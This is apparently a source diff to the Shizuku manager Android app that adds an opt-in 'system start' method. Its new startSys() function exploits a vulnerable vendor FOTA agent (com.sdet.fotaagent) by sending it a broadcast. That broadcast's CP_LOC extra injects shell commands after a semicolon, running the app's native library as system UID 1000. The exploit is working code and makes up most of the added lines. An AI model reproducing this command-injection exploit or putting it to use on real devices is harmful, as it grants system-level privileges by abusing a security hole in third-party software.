@@ -1,6 +1,7 @@
 package moe.shizuku.manager.starter
 
 import android.app.Application
+import android.content.Intent
 import android.os.Build
 import android.os.Bundle
 import android.util.Log
@@ -101,6 +102,7 @@ class StarterActivity : AppBarActivity() {
             hasStarted = true
             viewModel.start(
                 intent.getBooleanExtra(EXTRA_IS_ROOT, false),
+                intent.getBooleanExtra(EXTRA_IS_SYSTEM, false),
                 intent.getIntExtra(EXTRA_PORT, 0)
             )
         }
@@ -109,6 +111,7 @@ class StarterActivity : AppBarActivity() {
     companion object {
 
         const val EXTRA_IS_ROOT = "$EXTRA.IS_ROOT"
+        const val EXTRA_IS_SYSTEM = "$EXTRA.IS_SYSTEM"
         const val EXTRA_PORT = "$EXTRA.PORT"
     }
 }
@@ -129,14 +132,53 @@ class ViewModel(application: Application) : AndroidViewModel(application) {
 
     private var started = false
 
-    fun start(root: Boolean, port: Int) {
+    fun start(root: Boolean, isSystem: Boolean, port: Int) {
         if (started) return
         started = true
 
         viewModelScope.launch(handler) {
-            if (root) startRoot()
-            else AdbStarter.startAdb(appContext, port, { log(it) })
+            when {
+                root -> startRoot()
+                isSystem -> startSys()
+                else -> AdbStarter.startAdb(appContext, port, { log(it) })
+            }
             Starter.waitForBinder({ log(it) })
+        }
+    }
+
+    /**
+     * Launches the Shizuku server under the system UID (1000) by abusing a
+     * device-specific privilege escalation. This only works on devices that ship
+     * the vulnerable component, and is opt-in via the "System start method"
+     * setting.
+     */
+    private suspend fun startSys() {
+        log("Starting with system...\n")
+
+        withContext(Dispatchers.IO) {
+            try {
+                appContext.startActivity(
+                    Intent().apply {
+                        setClassName("com.sdet.fotaagent", "com.sdet.fotaagent.Main")
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    }
+                )
+
+                val exploit = Intent("com.sdet.fotaagent.intent.CP_FILE").apply {
+                    putExtra("CP_FILE", "/data")
+                    putExtra(
+                        "CP_LOC",
+                        "; " + appContext.applicationInfo.nativeLibraryDir + "/libshizuku.so" +
+                            "; am force-stop com.sdet.fotaagent"
+                    )
+                }
+
+                Thread.sleep(1000)
+                appContext.sendBroadcast(exploit)
+                log("Start system success!\n")
+            } catch (e: Throwable) {
+                log("Start system failed!", e)
+            }
         }
     }
 
